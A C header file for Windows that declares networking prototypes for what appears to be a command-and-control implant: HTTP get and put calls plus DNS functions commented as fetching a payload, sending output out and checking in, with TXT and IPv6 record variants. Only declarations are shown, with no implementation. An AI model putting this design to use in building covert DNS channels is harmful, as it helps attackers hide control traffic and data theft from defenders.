#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

void http_init(char * host, int port, char * ua);
void http_close();
void http_put(char * url, void * buffer, int len, BOOL postNow);
void http_post_maybe(char * url);
int http_get(char * url, void * cookie, char* buffer, int max);

BOOL channel_lookup(char * domain, unsigned int * result);
unsigned int channel_lookup_retry(char * domain, int retry);

u_long channel_localip();
void channel_winsock_init();

/* get payload via DNS */
unsigned int dns_get(char * domain, char * buffer, int max);

/* put output via DNS */
void dns_put(char * type, char * domain, char * buffer, int length);

/* perform a checkin via DNS */
void dns_checkin(char * domain, char * buffer, int length);

/* function prototypes */
int channel_lookup_retry_txt(char * domain, int retry, char * buffer, int max);
unsigned int dns_get_txt(char * domain, char * buffer, int max);
int channel_lookup_retry6(char * domain, int retry, char * buffer);
unsigned int dns_get6(char * domain, char * buffer, int max);
void set_max_dns(unsigned int signal);